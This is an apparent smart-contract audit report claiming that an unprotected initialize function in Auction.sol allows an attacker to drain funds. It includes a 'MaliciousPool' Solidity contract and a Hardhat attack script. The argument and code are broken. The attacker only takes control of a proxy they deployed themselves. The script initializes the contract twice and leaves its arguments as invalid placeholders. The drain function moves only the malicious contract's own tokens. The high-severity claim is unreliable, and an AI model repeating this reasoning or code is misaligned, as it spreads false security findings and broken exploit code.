# Drain of Funds in Auction.sol

### Summary


The `initialize` function in the `Auction.sol` contract assigns the `pool` address to `msg.sender` without any access control restrictions. That oversight allows any entity capable of initializing the contract to set the `pool` to an arbitrary or malicious address, enabling unauthorized control over critical auction functionalities. Such unrestricted initialization poses severe risks, including protocol compromise and significant financial losses for users.

which will cause funds drain and couple high severity scenarios that we can avoid.



### Root Cause

**Issue:**  
The `initialize` function in `Auction.sol` sets the `pool` address to `msg.sender` without verifying the caller's authority or intention. This lack of access control permits unauthorized entities to initialize the contract and designate a malicious `pool` contract.

**Affected Code Snippet (`Auction.sol`):**
```solidity
function initialize(
    address _buyCouponToken, 
    address _sellReserveToken, 
    uint256 _totalBuyCouponAmount, 
    uint256 _endTime, 
    uint256 _maxBids, 
    address _beneficiary, 
    uint256 _poolSaleLimit
) initializer public {
    __UUPSUpgradeable_init();

    buyCouponToken = _buyCouponToken; // coupon
    sellReserveToken = _sellReserveToken; // reserve
    totalBuyCouponAmount = _totalBuyCouponAmount; // coupon amount
    endTime = _endTime;
    maxBids = _maxBids;
    pool = msg.sender;
    poolSaleLimit = _poolSaleLimit;

    if (_beneficiary == address(0)) {
        beneficiary = msg.sender;
    } else {
        beneficiary = _beneficiary;
    }
}
```

### Attack Path

Given the interactions between `Deployer.sol`, `PoolFactory.sol`, and `Pool.sol`, the attack path for exploiting `Auction.sol` can be outlined as follows:

1. **Deployment:**
   - **Step 1:** Attacker deploys a separate proxy pointing to the vulnerable `Auction.sol` implementation.
   
2. **Initialization:**
   - **Step 2:** Attacker calls the `initialize` function on their proxy instance of `Auction.sol`.
   - **Step 3:** Since `initialize` is `public` and lacks access control, `pool` is set to `msg.sender` (the attacker's address).
   
3. **Exploitation:**
   - **Step 4:** The malicious `pool` contract gains unauthorized control over auction functionalities, allowing actions like draining funds, manipulating bids, or altering state transitions.

**Impact:**
- **Financial Losses:** Users participating in auctions may suffer losses due to unauthorized fund transfers or manipulated auction outcomes.
- **Protocol Compromise:** The integrity and trustworthiness of the protocol are undermined, potentially leading to reputational damage and loss of user confidence.

### Impact

- **Unauthorized Control:** Attackers can set the `pool` address to a malicious contract, granting them complete control over auction functionalities.
  
- **Protocol Compromise:** Malicious manipulation can disrupt auction operations, leading to incorrect fund allocations, unauthorized token transfers, and overall protocol instability.
  
- **Financial Losses:** Users may lose funds due to fraudulent auction manipulations, undermining the protocol's economic integrity.
  


### PoC

### Steps taken by attacker 

1. **Deploy Malicious Pool Contract:**
 First Attacker will create a malicious contract mimicking expected `pool` functionalities but with malicious intent.

2. **Deploy Proxy Pointing to Vulnerable `Auction.sol`:**
   Then Attacker deploys a proxy contract that points to the `Auction.sol` implementation.

3. **Initialize via Proxy:**
   - Attacker calls the `initialize` function through the proxy.
   - During initialization, `pool` is set to `msg.sender` (attacker's address), effectively assigning control to the attacker.

4. **Manipulate Auction Operations:**
   - With control over the `pool` address, the attacker can perform unauthorized actions such as draining funds, altering auction states, or disrupting bid management.

### Example 

**MaliciousPool.sol**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousPool {
    address public auction;

    constructor(address _auction) {
        auction = _auction;
    }

    // Example malicious function to drain funds
    function drainFunds(address reserveToken) external {
        IERC20(reserveToken).transfer(msg.sender, IERC20(reserveToken).balanceOf(address(this)));
    }

    // Additional malicious functions as needed
}
```

**AttackScript.js**
```javascript
// AttackerScript.js
const { ethers, upgrades } = require("hardhat");

async function main() {
    const [attacker] = await ethers.getSigners();

    // Deploy MaliciousPool
    const MaliciousPool = await ethers.getContractFactory("MaliciousPool");
    const maliciousPool = await MaliciousPool.deploy(/* parameters if any */);
    await maliciousPool.deployed();
    console.log("MaliciousPool deployed at:", maliciousPool.address);

    // Deploy Proxy for Auction.sol
    const Auction = await ethers.getContractFactory("Auction");
    const proxy = await upgrades.deployProxy(Auction, [
        /* _buyCouponToken */,
        /* _sellReserveToken */,
        /* _totalBuyCouponAmount */,
        /* _endTime */,
        /* _maxBids */,
        /* _beneficiary */,
        /* _poolSaleLimit */
    ], { initializer: 'initialize' });
    await proxy.deployed();
    console.log("Auction Proxy deployed at:", proxy.address);

    // Initialize Auction via Proxy, setting pool to msg.sender (attacker)
    await proxy.initialize(
        /* _buyCouponToken */,
        /* _sellReserveToken */,
        /* _totalBuyCouponAmount */,
        /* _endTime */,
        /* _maxBids */,
        /* _beneficiary */,
        /* _poolSaleLimit */
    );

    // Now, pool is set to msg.sender, which is the attacker.
    // To set it to MaliciousPool, attacker needs to manipulate the initialize call accordingly.
}

main();
```

### Mitigation


1.Restrict Initialization Access
2.Parameterize and Validate `pool` Address
